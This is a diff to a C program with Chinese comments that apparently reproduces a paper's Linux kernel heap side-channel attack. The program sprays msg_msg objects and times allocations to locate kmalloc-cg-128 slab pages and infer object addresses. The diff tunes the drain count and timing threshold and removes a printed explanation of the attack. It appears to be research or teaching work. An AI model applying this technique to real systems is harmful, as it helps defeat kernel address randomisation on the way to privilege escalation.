@@ -8,7 +8,7 @@
 #include <unistd.h>
 
 #define MSG_PAYLOAD     72
-#define DRAIN_COUNT   2000    // 加大排空數量
+#define DRAIN_COUNT   2016    // 加大排空數量
 #define TARGET_COUNT   300
 #define OBJS_PER_SLAB   32    // kmalloc-cg-128: 4096÷128=32
 
@@ -77,7 +77,7 @@ int main() {
     printf("  編號  時間(cycles)  視覺化\n");
     printf("  ----  ------------  ------\n");
 
-    uint64_t threshold = median_threshold(raw_times, TARGET_COUNT, 5.0);
+    uint64_t threshold = median_threshold(raw_times, TARGET_COUNT, 2.0);
 
     for (int i = 0; i < 60; i++) {
         const char *bar = (target[i].time >= threshold) ? "▓▓▓ << 慢（新 slab page）"
@@ -85,7 +85,7 @@ int main() {
         printf("  %-4d  %-12lu  %s\n", i, target[i].time, bar);
     }
 
-    printf("\n  自動閾值（中位數 × 5）：%lu cycles\n\n", threshold);
+    printf("\n  自動閾值（中位數 × 2）：%lu cycles\n\n", threshold);
 
     /* 步驟 4：分組 */
     printf("步驟 4：依慢分配事件分組\n\n");
@@ -126,15 +126,6 @@ int main() {
         printf("  %-10d %-8d %-30s %s\n", g, cnt, simple, status);
     }
     if (current_group > 12) printf("  ...（只顯示前 12 個）\n");
-
-    /* 結論 */
-    printf("\n=== 結論 ===\n\n");
-    printf("  攻擊者透過計時，識別出哪些 msg_msg 在同一個 slab page\n");
-    printf("  每個 slab page 的物件位址可直接計算：\n");
-    printf("    msg_msg[n].addr = slab_base + 128 × n\n\n");
-    printf("  結合 TLB 側通道洩漏的 slab_base，\n");
-    printf("  就能得到每個物件的精確位址。\n");
-    printf("  這就是論文 Section 5 的完整攻擊！\n");
 
     /* 清理 */
     for (int i = 0; i < DRAIN_COUNT; i++) msgctl(drain_qids[i], IPC_RMID, NULL);
